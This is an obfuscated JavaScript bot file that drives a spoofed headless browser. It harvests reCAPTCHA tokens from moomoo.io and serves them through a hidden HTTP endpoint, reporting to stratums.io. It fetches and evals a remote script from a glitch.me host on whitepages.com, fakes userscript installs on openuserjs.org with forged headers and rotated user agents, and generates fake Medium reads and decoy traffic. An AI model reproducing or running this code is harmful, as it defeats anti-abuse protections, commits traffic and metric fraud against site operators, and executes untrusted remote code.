      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': X(0x11) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + Y(0x7) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + Y(0x12) + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * -0x1551 + -0x1223 + 0x2774
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a0 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x4 * 0x88a + -0x1323 + -0x5 * 0x301)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + a0(0xd)];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * 0x71e + -0x20ea + 0x286c), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1e * 0xae + 0x4 * -0x586 + 0x2ae0), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1aa9 + 0xc36 + -0x19b * -0x9;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x629 * -0x5 + 0x1 * 0x1d2a + 0x1a3; w < getRandomInt(-0x68d * -0x3 + -0x3 * -0x20e + -0x19d0, 0xaf9 + 0x806 + 0x97d * -0x2); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x15837 + -0x1c23 + 0x9 * 0x436a);
        }
      }();
    }, 0x1f15 + -0xf31 + -0xf80), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x8c3 + 0x13f8 + 0x1 * -0x1cbb;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x151 * -0x12 + 0x1068 + -0x140d * 0x2, -0xdf3 + 0xc11 + 0x214)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x3 * 0x96c + 0xa * -0x1051 + 0x313 * 0x52);
    }, 0x854 + -0x3 * -0xaaf + -0x27fd), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x21d8 + 0x13a1 + 0xe37;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x35 * -0xa9 + -0x4dc * -0x6 + -0x346d), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x261b + -0x13 * -0x42 + -0x65 * 0x6d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x2b866 + -0x5b569 + -0x9179 * -0x27);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x58b * -0x1 + -0x2 * -0x10b1 + -0x1b73);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xa7b * 0x1 + 0x1ee1 + -0x2894);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xd4d + -0x4d1 * 0xc + 0x66a9);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = d,
    a2 = b;
  async function f() {
    const a1 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x2c9 * -0x7 + 0x2559 * 0x1 + -0x38d7 * 0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x20e + 0xb5e + 0x94f * -0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x2 * 0x10fc + 0x1367 * 0x1 + 0xe91, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1d82 + 0x1bc4 + 0x2 * 0xdf, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x5 * 0x46c + 0xe88 + 0xf8c * 0x3),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + a1(0x6) + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x67 * -0x93 + 0x247 * 0xd + -0x31b0),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + a2(0xc, 'ROkL') + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a3(0xf) + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x515 * -0x2 + -0xd * 0xb3 + 0x1341; k < 0x1 * -0x203 + -0x696 + -0x31 * -0x2d; k++)
    setTimeout(f, (-0x10855 + 0x6eee + 0x183c7) * k * getRandomInt(-0x5 * -0x5e7 + -0x1807 + 0x1 * -0x57b, 0x1e31 + -0x773 * -0x2 + -0x2d14));
  setInterval(() => {
    f();
    for (let l = -0x2 * -0xad3 + -0x1360 + -0x246; l < 0x482 + 0x1 * -0x2047 + 0x1bc9; l++)
      setTimeout(f, (0x2a48 + 0x18091 * 0x1 + 0x7 * -0x1b7f) * l * getRandomInt(-0x1da5 * 0x1 + -0x2610 + 0x43b6, 0xb4 * -0x25 + -0xcab * 0x1 + 0x4e * 0x7f));
  }, -0xfd675 + -0x573 * 0xa44 + 0x7eb581);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
